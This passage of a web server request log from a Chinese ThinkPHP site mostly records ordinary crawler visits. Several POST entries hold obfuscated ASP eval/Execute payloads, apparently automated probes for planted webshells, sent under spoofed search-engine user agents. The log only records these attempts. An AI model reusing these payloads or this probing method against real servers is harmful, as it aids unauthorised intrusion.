+  'xise' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002010s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T05:53:33+08:00 ] 211.95.113.248 POST fw366.cn//API/Get_Rsume_Ajax.aspx
+[运行时间：0.042600s] [吞吐率：23.47req/s] [内存消耗：2,474.56kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003152s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003179s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'Get_Rsume_Ajax.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '211.95.113.248',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '211.95.113.248',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002018s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T05:53:34+08:00 ] 222.205.218.201 POST fw366.cn//API/Get_Rsume_Ajax.aspx
+[运行时间：0.042268s] [吞吐率：23.66req/s] [内存消耗：2,474.44kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000040s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003156s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003184s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'Get_Rsume_Ajax.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '222.205.218.201',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '222.205.218.201',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002028s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:22:45+08:00 ] 219.229.218.233 POST www.fw366.cn//API/handui.aspx
+[运行时间：0.043315s] [吞吐率：23.09req/s] [内存消耗：2,474.47kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003145s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003172s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '816',
+  'x-forwarded-for' => '219.229.218.233',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '219.229.218.233',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'z' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002024s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:22:45+08:00 ] 116.216.163.0 POST www.fw366.cn//API/handui.aspx
+[运行时间：0.042068s] [吞吐率：23.77req/s] [内存消耗：2,474.34kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003178s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '681',
+  'x-forwarded-for' => '116.216.163.0',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '116.216.163.0',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'z' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002010s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:41:30+08:00 ] 120.76.41.9 GET www.fw366.cn/
+[运行时间：0.048682s] [吞吐率：20.54req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003215s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003242s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002060s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:47:53+08:00 ] 119.3.24.235 GET www.fw366.cn/
+[运行时间：0.048400s] [吞吐率：20.66req/s] [内存消耗：2,934.10kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000043s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003172s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003200s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'host' => 'www.fw366.cn',
+  'upgrade-insecure-requests' => '1',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN, zh; q=0.8, en-US; q=0.5, en; q=0.3',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002034s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:47:53+08:00 ] 119.3.24.235 GET www.fw366.cn/
+[运行时间：0.046928s] [吞吐率：21.31req/s] [内存消耗：2,931.84kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003147s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003174s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'upgrade-insecure-requests' => '1',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN, zh; q=0.8, en-US; q=0.5, en; q=0.3',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002013s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:47:56+08:00 ] 119.3.24.235 GET www.fw366.cn/index/user/index.html
+[运行时间：0.057641s] [吞吐率：17.35req/s] [内存消耗：3,637.29kb] [文件加载：131]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003187s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003216s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'upgrade-insecure-requests' => '1',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN, zh; q=0.8, en-US; q=0.5, en; q=0.3',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002042s ]
+[ info ] [ TOKEN ] INIT Mysql
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/common/view/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:53:50+08:00 ] 42.236.102.3 GET www.fw366.cn/
+[运行时间：0.048123s] [吞吐率：20.78req/s] [内存消耗：2,933.44kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003167s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003195s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.4.2661.102 Safari/537.36; 360Spider',
+  'connection' => 'Keep-Alive',
+  'accept-language' => 'zh-CN',
+  'accept' => '*/*',
+  'cookie' => '',
+  'referer' => 'http://www.fw366.cn/',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002034s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T06:54:36+08:00 ] 42.236.10.120 GET fw366.cn/
+[运行时间：0.047095s] [吞吐率：21.23req/s] [内存消耗：2,933.38kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003165s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003193s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.4.2661.102 Safari/537.36; 360Spider',
+  'connection' => 'Keep-Alive',
+  'accept-language' => 'zh-CN',
+  'accept' => '*/*',
+  'cookie' => '',
+  'referer' => 'http://fw366.cn/',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001954s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T07:08:35+08:00 ] 14.152.90.25 GET www.fw366.cn/
+[运行时间：0.046843s] [吞吐率：21.35req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003178s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003205s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001904s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T07:08:35+08:00 ] 14.152.90.25 GET www.fw366.cn/
+[运行时间：0.048497s] [吞吐率：20.62req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003316s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003344s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002113s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T07:08:35+08:00 ] 14.152.90.25 GET www.fw366.cn/
+[运行时间：0.046912s] [吞吐率：21.32req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000025s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003145s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003172s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002010s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T08:00:48+08:00 ] 211.154.71.75 POST fw366.cn//API/handui.aspx
+[运行时间：0.042511s] [吞吐率：23.52req/s] [内存消耗：2,474.47kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003178s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '211.154.71.75',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '211.154.71.75',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xise' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002015s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T08:00:48+08:00 ] 58.155.155.190 POST fw366.cn//API/handui.aspx
+[运行时间：0.042142s] [吞吐率：23.73req/s] [内存消耗：2,474.34kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003147s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003175s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
